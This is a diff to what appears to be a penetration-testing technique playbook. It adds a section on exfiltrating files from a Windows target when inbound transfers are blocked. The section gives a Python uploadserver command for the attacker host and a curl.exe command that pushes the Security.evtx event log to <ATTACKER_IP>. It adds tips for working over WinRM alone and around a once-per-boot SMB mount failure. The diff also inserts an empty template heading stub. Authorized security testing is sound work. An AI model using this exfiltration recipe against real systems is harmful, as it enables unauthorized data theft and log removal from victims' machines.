@@ -338,3 +338,32 @@ wget http://<target-ip>:<port>/<bundle>.zip
 - If the http.server belongs to the environment or another user, never kill or restart it to change its root; find a path it already serves.
 
 <!-- promoted-slug: exfil-off-windows -->
+
+## <Heading>
+
+<generic technique steps; no client host/IP/domain>
+
+## Push exfil lane: uploadserver + curl.exe (when pull lanes are blocked)
+
+Add to the lane ranking above: when the target firewall blocks inbound (no http.server to pull
+from, HttpListener refused on all profiles) and SMB dies after its first mount, run a Python
+`uploadserver` on the attacker box and have the TARGET push each file with its built-in curl:
+
+```sh
+python3 -m uploadserver 8000   # pip install uploadserver; serves GET + accepts POST /upload
+```
+
+```powershell
+curl.exe -s -o NUL -F files=@C:\Windows\System32\winevt\Logs\Security.evtx http://<ATTACKER_IP>:8000/upload
+```
+
+- Works over only WinRM command exec (no RDP, no SMB), multi-file, no staging needed.
+- URL-encode `%` in paths (`Microsoft-Windows-Sysmon%4Operational.evtx` works as-is: `%4` is
+  the literal in the filename and curl sends it fine; spaces do NOT work unquoted - stage
+  space-named files to temp names first).
+- Gotcha when pairing with an impacket-smbserver lane: an impacket-smbserver mount from a Windows client works
+  ONCE per boot; every later `net use` fails with `System error 1312` (cached logon session, client
+  falls back to machine-credential auth `(\,HOSTNAME)`), and restarting LanmanWorkstation does not
+  clear it. Take the one transfer, then switch to the push lane.
+
+<!-- promoted-slug: exfil-push-uploadserver -->
